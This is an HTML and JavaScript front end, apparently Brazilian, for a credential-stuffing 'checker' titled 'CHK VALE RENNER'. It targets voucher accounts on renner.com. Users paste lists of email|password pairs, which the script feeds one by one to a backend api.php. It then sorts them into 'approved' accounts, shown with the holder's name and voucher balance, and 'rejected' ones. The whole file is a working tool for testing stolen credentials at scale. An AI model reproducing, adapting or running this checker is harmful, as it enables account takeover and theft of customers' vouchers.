<!DOCTYPE html>
<html lang="en" data-textdirection="ltr">

<head>
    <!-- Colocando icon na barra de endereço -->
    <link rel="shortcut icon" href="comida-real.ico" type="image/x-icon" />
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <meta name="description" content="CHK renner.com">
    <meta name="keywords" content="CHK, verificador, email, senha">
    <meta name="author" content="Niklausec">
    <title>CHK VALE RENNER</title>
    <link rel="apple-touch-icon" href="theme-assets/images/ico/apple-icon-120.png">
    <link rel="shortcut icon" type="image/x-icon" href="theme-assets/images/logo/logo.png">
    <link href="https://fonts.googleapis.com/css?family=Muli:300,300i,400,400i,600,600i,700,700i|Comfortaa:300,400,700"
        rel="stylesheet">
    <link href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
        integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <style>
    body {
        background: #333333;
        color: #ffffff;
    }

    .card-header h4 {
        color: #ffffff;
    }

    .badge-neon-green {
        background-color: #00ff00;
    }

    .badge-neon-red {
        background-color: #ff0000;
    }

    .badge-neon-blue {
        background-color: #0000ff;
    }

    .badge-neon-pink {
        background-color: #ff00ff;
    }

    .text-neon-blue {
        color: #00f0ff;
    }

    .text-neon-green {
        color: #00ff00;
    }

    .text-neon-red {
        color: #ff0000;
    }
    </style>
</head>

<body class="vertical-layout vertical-menu 2-columns menu-expanded fixed-navbar" data-open="click"
    data-menu="vertical-menu" data-color="bg-chartbg" data-col="2-columns">
    <div class="container mt-4" style="margin-bottom: 100px;">
        <div class="text-center mb-3">
            <h1 class="text-neon-blue"><b>CHK VALE RENNER</b></h1>
            <div class="text-center">
                <h class="text-neon-blue"></h>
                <h class="text-neon-blue">
                    <b><span class='badge badge-neon-pink'>FORMATO : EMAIL|SENHA</span></b>
                </h>
            </div>
            <fieldset class="form-group">
                <textarea class="form-control bg-dark text-neon-green"
                    style="resize: none;text-align: center;margin: auto;" rows="5" id="lista"
                    placeholder="Digite e-mails e senhas no formato EMAIL|SENHA"></textarea>
            </fieldset>
            <center>
                <div class="mb-3">
                    <button type="button" class="btn btn-cyber-blue btn-min-width mr-1 mb-1" id="testar"
                        onclick="enviar()">INICIAR</button>
                    <button type="button" class="btn btn-cyber-gray btn-min-width mr-1 mb-1" id="parar"
                        disabled>PARAR</button>
                    <a href="../../../" class="btn btn-cyber-green btn-min-width mr-1 mb-1">VOLTAR</a>
                </div>
            </center>
            <center>
                <div class="badge badge-neon-green badge-pill" style="padding: 10px 10px;margin: 5px;">
                    <i class="la la-check"></i>
                    <span style="font-size: 15px;"> Aprovados</span>
                    <span style="font-size: 15px;" id="cLive">0</span>
                </div>
                <div class="badge badge-neon-red badge-pill" style="padding: 10px 10px;margin: 5px;">
                    <i class="la la-close"></i>
                    <span style="font-size: 15px;"> Reprovados</span>
                    <span style="font-size: 15px;" id="cDie">0</span>
                </div>
                <div class="badge badge-neon-blue badge-pill" style="padding: 10px 10px;margin: 5px;">
                    <i class="la la-clock-o"></i>
                    <span style="font-size: 15px;"> Testados</span>
                    <span style="font-size: 15px;" id="total">0</span>
                </div>
                <div class="badge badge-neon-pink badge-pill" style="padding: 10px 10px;margin: 5px;">
                    <i class="la la-cloud-upload"></i>
                    <span style="font-size: 15px;"> Carregados</span>
                    <span style="font-size: 15px;" id="carregadas">0</span>
                </div>
            </center>
            <center>
                <div class="text-center text-neon-blue mt-3">
                    <h4 class="text-neon-blue" id="status_ccs">AGUARDANDO INICIO</h4>
                </div>
            </center>
            <div class="col-md-12 mt-3 p-0">
                <div class="card bg-dark text-neon-blue">
                    <div class="card-body">
                        <h6 style="font-weight: bold;" class="card-title text-neon-blue"> <span
                                style="color: lime;">|_________________________________________________________________
                                APROVADA_________________________________________________________________|</span>
                            <br><br>
                        </h6>
                        <div id="Aprovada"></div>
                        </center>
                        <div class="col-md-12 mt-3 p-0">
                            <div class="card bg-dark text-neon-blue">
                                <div class="card-body">
                                    <h6 style="font-weight: bold;" class="card-title text-neon-blue"> <span
                                            style="color: red;">|_________________________________________________________________
                                            REPROVADA
                                            _________________________________________________________________|</span>
                                        <br><br>
                                    </h6>
                                    <div id="Reprovada"></div>
                                    </center>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
                <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"
                    integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV"
                    crossorigin="anonymous">
                </script>
                <script>
                function enviar() {
                    var lista = $("#lista").val().trim();
                    if (lista === '') {
                        alert('Por favor, insira e-mails e senhas no formato EMAIL|SENHA.');
                        return;
                    }

                    var linhas = lista.split("\n").filter(function(linha) {
                        return linha.trim() !== '';
                    });

                    if (linhas.length === 0) {
                        alert('Nenhum dado válido encontrado.');
                        return;
                    }

                    var total = linhas.length;
                    var aprovados = 0;
                    var reprovados = 0;

                    $('#testar').attr('disabled', 'disabled');
                    $('#parar').attr('disabled', null);

                    linhas.forEach(function(linha, index) {
                        setTimeout(function() {
                            var ajaxCall = $.ajax({
                                url: 'api.php?lista=' + encodeURIComponent(linha),
                                type: 'GET',
                                success: function(response) {
                                    if (response.error) {
                                        $('#resultados').prepend(
                                            '<div class="text-neon-red">' +
                                            response.error + '</div>');
                                    } else {
                                        response.forEach(function(res) {
                                            if (res.status === 'Aprovada') {
                                                aprovados++;
                                                $('#Aprovada').prepend(
                                                    '<div class="text-neon-green">✔️ Aprovada: ' +
                                                    res.email + ' | ' + res
                                                    .senha + ' | ' +
                                                    res.nome + ' | ' + res
                                                    .vale + '</div>');
                                            } else {
                                                reprovados++;
                                                $('#Reprovada').prepend(
                                                    '<div class="text-neon-red">❌ Reprovada: ' +
                                                    res.email + ' | ' + res
                                                    .senha + ' | ' +
                                                    res.motivo + '</div>');
                                            }
                                        });
                                    }

                                    $('#carregadas').html(total);
                                    var testados = aprovados + reprovados;
                                    $('#cLive').html(aprovados);
                                    $('#cDie').html(reprovados);
                                    $('#total').html(testados);

                                    if (testados == total) {
                                        $('#testar').attr('disabled', null);
                                        $('#parar').attr('disabled', 'disabled');
                                        $('#lista').attr('disabled', null);
                                        $('#status_ccs').html('FINALIZADO');
                                        setTimeout(function() {
                                            $('#status_ccs').html(
                                                'AGUARDANDO INICIO...');
                                        }, 2000);
                                    }
                                },
                                error: function() {
                                    $('#resultados').prepend(
                                        '<div class="text-neon-red">Erro ao processar: ' +
                                        linha +
                                        '</div>');
                                    $('#carregadas').html(total);
                                }
                            });

                            $('#parar').click(function() {
                                ajaxCall.abort();
                                $('#testar').attr('disabled', null);
                                $('#parar').attr('disabled', 'disabled');
                                $('#status_ccs').html('PROCESSO INTERROMPIDO');
                            });
                        }, 500 * index);
                    });
                }
                </script>
</body>

</html>